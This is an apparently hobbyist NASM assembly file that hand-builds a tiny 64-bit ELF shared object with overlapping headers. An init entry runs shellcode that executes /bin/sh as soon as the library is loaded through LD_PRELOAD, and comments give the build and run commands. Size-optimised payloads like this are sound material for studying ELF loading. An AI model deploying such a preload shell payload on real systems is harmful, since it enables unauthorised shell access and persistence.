;  further overlap the EHDR and PHDR
;  
;  Build with:
;	nasm -f bin shell.asm shell.so
;  Execute with:
;	LD_PRELOAD=./putter.so	/bin/true
;
;  218 bytes!  Goal was 194... needed to refactor shellcode loading method to fewer instructions
;
BITS 64
org     0
ehdr:
  db    0x7f, "ELF", 2, 1, 1, 0    ; e_ident
  db    0,0,0,0,0,0,0,0
  dw    3                          ; e_type    = ET_DYN
  dw    62                         ; e_machine = EM_X86_64
  dd    1                          ; e_version = EV_CURRENT
  dq    _start                     ; e_entry   = _start
  dq    phdr - $$                  ; e_phoff
  dd    0                          ; e_shoff
  dq    0                          ; e_flags
  dw    ehdrsize                   ; e_ehsize
  dw    phdrsize                   ; e_phentsize
  dw    2                          ; e_phnum
ehdrsize equ  $ - ehdr
phdr:
  dd    1                          ; p_type   = PT_LOAD
  dd    7                          ; p_flags  = rwx
  dq    0                          ; p_offset
  dq    $$                         ; p_vaddr
  dq    $$                         ; p_paddr
  dq    0xDEADBEEF                 ; p_filesz
  dq    0xDEADBEEF                 ; p_memsz
  dq    0x1000
phdrsize equ  $ - phdr
  dd    2                          ; p_type  = PT_DYNAMIC
  dd    7                          ; p_flags = rwx
  dq    dynsection                 ; p_offset
  dq    dynsection                 ; p_vaddr
dynsection:
; DT_INIT
  dq    0x0c
  dq    _start
; DT_STRTAB
  dq    0x05
  dq    _start
; DT_SYMTAB
  dq    0x06
  dq    _start
shellcode:
        pop rdi
        xor rax, rax
        mov [rdi+8], rdi
        lea rsi, [rdi+8]
        lea rdx, [rax]
        mov al, 59
        syscall
_start:
        call shellcode
        file: db '/bin/sh',0

